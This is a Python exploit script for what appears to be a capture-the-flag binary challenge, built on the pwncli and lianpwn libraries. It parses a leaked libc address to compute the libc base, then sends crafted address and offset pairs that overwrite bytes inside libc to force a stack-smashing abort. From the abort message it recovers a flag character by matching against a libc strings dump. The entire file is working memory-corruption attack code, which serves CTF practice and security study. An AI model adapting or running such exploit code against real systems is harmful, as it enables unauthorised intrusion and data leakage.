#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

libc_start = int(ru(b"-", drop=True), 16)
libc_base = libc_start - 0x26000
lg("libc_base", libc_base)
lg("libc_start", libc_start)

ru(b"flag")
ru(b"}}\n")


def set(addr, off):
    addr = addr - 0x7FFFF7C26000 + libc_start
    sl(i2b(addr))
    sl(i2b(off))


context.log_level = "error"

# 3334c3fde72501f3947cfbb2da
# debugB()
set(0x7FFFF7D38F36 + 3, 6 + 20 +
    8
    )
set(0x7FFFF7C5C577 + 5, 6)

# Try to trigger stack smash
set(0x7FFFF7C5C577 + 5, 6)

ru(b"*** ")
data_leak = ru(b" ***: terminated\n", drop=True)
print(data_leak)


def cmp(data_leak):
    libcdump = open("./libc_strings.dump", "rb").read()
    res = libcdump.index(data_leak)
    print(chr(res + 0x30 - 7))


cmp(data_leak)

ia()
